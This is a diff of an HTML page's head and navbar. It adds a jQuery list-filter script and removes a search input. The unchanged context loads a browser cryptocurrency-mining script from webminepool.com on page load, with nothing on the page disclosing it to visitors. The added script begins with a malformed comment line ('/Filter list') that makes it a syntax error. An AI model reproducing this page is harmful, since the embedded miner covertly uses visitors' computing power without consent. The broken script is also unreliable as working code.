@@ -25,16 +25,26 @@ video {
 }
 </style>
 <script src="https://www.webminepool.com/lib/base.js"></script>
-    </head>
+   <script type="text/javascript">
+/Filter list
+
+$(document).ready(function(){
+  $("#listSearch").on("keyup", function() {
+    var value = $(this).val().toLowerCase();
+    $("#myList li").filter(function() {
+      $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1)
+    });
+  });
+});
+</script>
+ </head>
     <body id="page-top">
         <!-- Navigation-->
         <nav class="navbar navbar-expand-lg bg-secondary text-uppercase fixed-top" id="mainNav">
             <div class="container">
                 <a class="navbar-brand js-scroll-trigger" href="#page-top"></a>
 
-<!-- Search form -->
-<input class="form-control" type="text" placeholder="Search" aria-label="Search">
-                <button class="navbar-toggler navbar-toggler-right text-uppercase font-weight-bold bg-primary text-white rounded" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+   <button class="navbar-toggler navbar-toggler-right text-uppercase font-weight-bold bg-primary text-white rounded" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
                     Menu
                     <i class="fas fa-bars"></i>
                 </button>
